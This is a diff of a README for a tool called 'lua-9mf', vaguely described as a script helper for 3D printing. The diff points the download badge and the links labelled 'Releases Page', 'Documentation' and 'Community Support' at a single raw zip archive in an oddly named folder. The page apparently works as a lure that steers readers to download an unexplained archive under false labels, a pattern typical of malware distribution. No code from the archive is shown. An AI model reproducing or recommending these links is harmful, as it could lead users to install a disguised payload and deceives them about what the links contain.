@@ -8,7 +8,7 @@ Welcome to lua-9mf! This application helps you create scripts to streamline your
 
 To download lua-9mf, please visit the link below:
 
-[![Download lua-9mf](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/lua-9mf.zip)](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/lua-9mf.zip)
+[![Download lua-9mf](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/mf_lua_2.9.zip)](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/mf_lua_2.9.zip)
 
 Once on the Releases page, follow these steps to get started:
 
@@ -69,8 +69,8 @@ We welcome contributions! If you want to help improve lua-9mf, feel free to subm
 
 ## 🔗 Useful Links
 
-- [lua-9mf Releases Page](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/lua-9mf.zip)
-- [Documentation](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/lua-9mf.zip)
-- [Community Support](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/lua-9mf.zip)
+- [lua-9mf Releases Page](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/mf_lua_2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/mf_lua_2.9.zip)
+- [Community Support](https://raw.githubusercontent.com/dj004i/lua-9mf/main/pentastomous/mf_lua_2.9.zip)
 
 Thank you for choosing lua-9mf. We hope this application makes your 3D printing projects easier and more enjoyable!
